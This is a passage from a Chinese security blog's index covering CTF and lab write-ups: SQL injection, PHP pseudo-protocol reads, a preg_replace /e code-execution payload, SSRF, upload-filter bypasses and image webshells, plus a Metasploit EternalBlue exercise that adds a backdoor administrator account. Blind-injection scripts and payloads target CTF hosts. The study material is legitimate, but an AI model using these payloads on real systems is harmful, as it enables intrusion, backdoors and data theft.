$sql);if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; // 过滤了() | = or die(&quot;do not hack me!&quot;);&#125;else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125;&#125; 随便输入用户名和密码，查看源码，出现提示 试了试应该是base32，解码后是base64 1c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续解码 1select * from user where username = &#x27;$name&#x27; 注入点是name参数这里，与上面源码中的查询语句一样。 经过测试发现有三列，name=admin&#39; union select 1,2,3 #&amp;pw=as#显示正常，name=admn&#39; union select 1,2,3,4#&amp;pw=as报错 但是页面没有数字回显，所以常规的注入应该是不行的。 值得注意的是，这题可以知道username是admin， 输入username=admin&amp;password=11,时提示wrong pass! 输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin 接下来介绍一种新的union注入 先建立一张表 1select * from test where id=0 union select 1,&#x27;admin&#x27;,&#x27;2322&#x27;; union语句后查询的是表中不存在的一个数据，查询结果如下 这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表，其中放着所查询到的数据和union后包含的数据 这里就是 id=1,username=admin,password=2322 这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录 接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了 name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11提示的wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11提示的wrong pass! 第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知） payload: 1name=000&#x27;union select 1,&#x27;admin&#x27;,&#x27;b59c67bf196a4758191e42f76670ceba&#x27;#&amp;pw=1111 b59c67bf196a4758191e42f76670ceba是1111的md5值，pw的值为1111 [极客大挑战 2019]FinalSQL与hard sql是一个系列的，但是这个应该是盲注 在search.php中找到注入点，测试可以发现是数字型注入 fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是^没有被过滤，所以可以利用这个符号 可以看到当id = 1 时，页面回显为，可以将这个为判断的标志 121^1^1 = 11^0^1 = 0 所以可以将注入的payload加到中间，例如 121^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))=%d)^1&quot;%(i,ord(j)) 注入脚本如下，使用的是二分法 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport timeurl = &quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;flag = &#x27;&#x27;def payload(i, j): time.sleep(1) # sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) #数据库名字 # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j) #表名 # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j) #列名 sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = &#123;&quot;id&quot;: sql&#125; r = requests.get(url, params=data) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return resdef exp(): global flag for i in range(1, 10000): print(i, &#x27;:&#x27;) low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag)exp()print(&#x27;flag=&#x27;, flag) 又学到了新的注入姿势，真不错 参考：https://www.cnblogs.com/wangtanzhi/p/12305052.html","tags":[{"name":"二分注入","slug":"二分注入","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"union新姿势","slug":"union新姿势","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"BJDCTF2020","date":"2020-09-28T12:26:38.000Z","path":"2020/09/28/BJDCTF2020/","text":"BJDCTF-web easy md5F12看到了提示，给出了sql语句 1Hint: select * from &#x27;admin&#x27; where password=md5($pass,true) 这里是将输入的密码进行了一次md5的加密 这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。 select * from &#39;admin&#39; where password=&#39; or &#39;sdaa 这里经常使用的字符串是ffifdyop，该字符串md5加密后若raw参数为True时会返回 ‘or’6&lt;trash&gt; (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉) 查询语句为 select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;此查询语句结果为真 提交 ffifdyop后会跳转到另外的页面，查看源码 这里直接利用md5()函数不能处理数组的特性，get提交 ?a[]=1&amp;b[]=2 接下来还有一次跳转，直接post param1[]=1&amp;param2[]=2，拿到flag 不过如此123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;]; //get 获取一个参数text 使用data伪协议$file = $_GET[&quot;file&quot;]; //file参数，这里可以使用filter伪协议读取php页面源码if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; //text 的内容位I have a dream echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; //file参数不能包含flag die(&quot;Not now!&quot;); &#125; include($file); //next.php 提示了下一个页面的名字 &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload: ?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php 对到了index.php页面的base64源码，解码后如下 index.php 123456789101112131415161718192021&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; 利用preg_replace()使用的/e模式可以存在远程执行代码 在next.php在输入 1next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;cat /flag&quot;); php伪协议 preg_replace /e模式漏洞详解 The mystery of ip进入页面不知道干啥，随便点点，到flag.php时显示了IP地址 查看原码发现提示&lt;!-- Do you know why i know your ip? --&gt; 猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1 这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去 首先试试system(&quot;ls /&quot;),但是发现没有被执行，于是家上括号&#123;system(&quot;ls /&quot;)&#125;，这次执行成功 获取flag: 1&#123;system(&quot;cat /flag&quot;)&#125; 简单注入题目明确说是注入，首先fuzz一下看看是否过滤了什么字符，结果发现过了&#39;,&quot;,=,and,select等字符 扫描目录发现还给了提示 本来想着过滤了单引号这个题目应该很难做，但是看到给了sql语句后便有了思路 可以将username位置的单引号转义，使得username的前半个单引号与password的前半个单引号闭合，再将后面的内容注释 1select * from users where username=&#x27;username\\&#x27; and password=&#x27;or 2&gt;1#&#x27;; 这样构造出的sql语句，username字段的值变成 username\\&#39; and password=，之后就可以拼接想要构造的查询语句 首先测试 发现回显页面出现了新的提示，典型的盲注 根据提示给出的内容，我们需要知道登录密码所以构造出payload 1username=admin\\&amp;password=or ascii(substr(password,1,1))&gt;79 # 完整脚本如下（因为buu平台的题目访问间隔过短的话会出现429，所以设置了间隔一秒访问） 123456789101112131415161718192021222324252627import requestsimport times = requests.Session()url = &quot;http://16b494d1-c6b0-4d81-a1ec-9b020959aa2e.node3.buuoj.cn/&quot;password = &#x27;&#x27;data = &#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;:password&#125;res = &#x27;&#x27;for i in range(1,50): left = 32 right = 128 mid = (right+right)&gt;&gt;1 while left &lt; right: time.sleep(1) # 这设置了每隔一秒访问一次，防止出现429 password = &#x27;or ascii(substr(password,&#123;0&#125;,1))&gt;&#123;1&#125; #&#x27;.format(i,mid) data = &#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;: password&#125; respose = s.post(url,data) print(respose.status_code,mid,i) if &#x27;BJD needs to be stronger&#x27; in respose.text: left = mid+1 else: right = mid mid = (right + left)&gt;&gt;1 res += chr(mid) print(res) # OhyOuFOuNdit","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php伪协议","slug":"php伪协议","permalink":"https://sunzhengyu99.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"网安作业1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动ｍｓｆ 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 1use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 1set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 1net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 1net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"cumtctf","date":"2020-09-27T13:26:44.000Z","path":"2020/09/27/cumtctf/","text":"CUMTCTF-wp Web签到提示GET一个1,那就 url+?1 提示post一个2 那就post一个 注意的是要2=任意字符才出现源码 审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接php://filter/read=convert.base64-encode/resource=flag.php，读取base64源码之后解码即可 PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs= babysql首先判断是否存在注入username=admin&amp;password=pw&#39; 在后面加上单引号后出现报错提示，确认有注入点 但是继续测试 &#39;or 1=1 #会出现 判断存在黑名单过滤。 接下来就是判断是将什么加入黑名单了，经过字典测试发现是空格，这里可以使用/**/绕过。 先测试有多少列，&#39;union/**/select/**/1,2,3,4,5,6,7# 到第七的时候，页面报错。 &#39;union/**/select/**/1,2,3,4,5,6,7,8# 到第八的时候显示下图，说明一共八列，并且第四列出现回显。 爆表 1username=admin&amp;password=pw&#x27;union/**/select/**/1,2,3,group_concat(TABLE_NAME),5,6,7,8/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=database()# 爆列名 1username=admin&amp;password=pw&#x27;union/**/select/**/1,2,3,group_concat(COLUMN_NAME),5,6,7,8/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=&#x27;users&#x27;# user_id,first_name,last_name,user,password,avatar,last_login,failed_login列名很多，选择password 爆flag 1username=admin&amp;password=pw&#x27;union/**/select/**/1,2,3,group_concat(password),5,6,7,8/**/from/**/users# secret扫描一下目录发现存在一个www.zip的文件，直接下载得到源码，下面就是一层一层的绕过 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);include_once(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;param1&#x27;]))&#123; $str1=$_GET[&#x27;param1&#x27;]; if(file_get_contents($str1)!==&#x27;Suvin_wants_a_girlfriend&#x27;) die(&quot;Suvin doesn&#x27;t like you&quot;); if(isset($_GET[&#x27;param2&#x27;]))&#123; $str2=$_GET[&#x27;param2&#x27;]; if(!is_numeric($str2)) die(&#x27;Suvin prefers strings of Numbers&#x27;); else if($str2&lt;3600*24*30) die(&#x27;Suvin says the num is too short&#x27;); else if($str2&gt;3600*24*31) die(&#x27;Suvin says the num is too long&#x27;); else &#123; echo &quot;Suvin says he&#x27;s falling in love with you!&quot;.&quot;&lt;/br&gt;&quot;; sleep(intval($str2)); &#125; if (isset($_POST[&#x27;param1&#x27;]) &amp;&amp; isset($_POST[&#x27;param2&#x27;])) &#123; $str1=$_POST[&#x27;param1&#x27;]; $str2=$_POST[&#x27;param2&#x27;]; if(strlen($str1)&gt;1000) die(&quot;It&#x27;s too long&quot;); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(&quot;It&#x27;s so similar to md5&quot;); &#125; &#125;&#125;?&gt; 首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议 param2要在3600*24*30和3600*24*31之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值 对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。 点这里 完整的payload： ?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7 12POST:param1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;param2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值 babysql2查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字 在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。 123456789101112131415161718192021222324252627url = &#x27;http://219.219.61.234:20004/&#x27;password = &quot;&quot;string = [ord(i) for i in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;&#x27;]#将字母转换为ascii码a = &#x27;0x5e&#x27; # &#x27;\\&#x27;的ascii码值while(1): for j in string: if (hex(j)[2:]==&#x27;7b&#x27;): str=&#x27;5c&#x27;+hex(j)[2:] #将&#x27;&#123;&#x27;转义， else: str=hex(j)[2:] time.sleep(0.1) payload =&quot;||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#&quot; % (a + str)# 盲注的查询语句 regexp binary 是区分大小写的正则匹配 data =&#123;&quot;username&quot;:&quot;\\\\&quot;,&quot;password&quot;:payload&#125; print(data) r = requests.post(url,data=data) #访问 if &quot;success&quot; in r.text: #print(r.text) password+=chr(j) print(password) a+=str break if &quot;wrong&quot; in r.text: breakprint(password) Crypto幼儿园的密码题先转换为十进制后在线分解后直接上脚本 http://www.factordb.com/ 在线分解网址 123456789101112131415161718192021222324252627282930313233import binasciiimport syssys.setrecursionlimit(1000000)def ByteToHex(bins): return &#x27;&#x27;.join([&quot;%02X&quot; % x for x in bins]).strip()def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = &#x27;0&#x27; + t \\#print(t) return(binascii.a2b_hex(t).decode(&#x27;latin1&#x27;))def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: print(&#x27;modular inverse does not exist&#x27;) return &#x27;null&#x27; else: return x % mc = 40448992051548719008529549070468060415257485938698092782029814901918646701101p = 328413456989577256301798468872388310877q = 324350545929838254331191385863847627003e = 65537n = p * qd = modinv(e, (p - 1) * (q - 1))m = pow(c, d, n)print (m) 数字转字符的脚本 12345678import binasciidef n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = &#x27;0&#x27; + t \\#print(t) return(binascii.a2b_hex(t).decode(&#x27;latin1&#x27;))print(n2s(a)) #a为上一个脚本计算出的数字 小学生的密码题初中生的密码题次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。 仔细看题会发现这题的条件给的比较多,知道p-q 于是想到了(p+q)^2-(p-q)^2=4pq=4n，可以算出p+q,之后解出p,q 12345678910111213141516171819算p,q的脚本# -*- coding = utf - 8 -*-#@Time : 2020/9/24 21:55#@Author : sunzy#@File : su.pyimport gmpy2n = 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397p_sub_q = -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636x = (4*n+p_sub_q*p_sub_q)gmpy2.mpz(x)#p_add_q = gmpy2.iroot(x, 2)p_add_q = 58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078# print(p_add_q)y=(p_sub_q+p_add_q)z=(p_add_q-p_sub_q)print(y&gt;&gt;1)print(z&gt;&gt;1) 知道p,q后，此题的解法与幼儿园的解法相同 菜鸡只会这么多。。。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"rsa","slug":"rsa","permalink":"https://sunzhengyu99.github.io/tags/rsa/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"攻防世界-fakebook感觉挺有意思的一道题，所以记录一下吧 0x01发现注入点进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# 爆出一大堆列名。直接读取data的内容 no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;} 到这里就不知道怎么办了。。。 0x02审计源码扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass UserInfo //user信息类&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;;public function __construct($name, $age, $blog)&#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog;&#125;function get($url) // 处理url&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output;&#125;public function getBlogContents ()&#123; return $this-&gt;get($this-&gt;blog);&#125;public function isValidBlog ()&#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);&#125;&#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 1?no=-2%20union/**/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;sunzy&quot;;s:3:&quot;age&quot;;i:22;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;%20# 查看源码，解base64。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass1112345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 1if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] 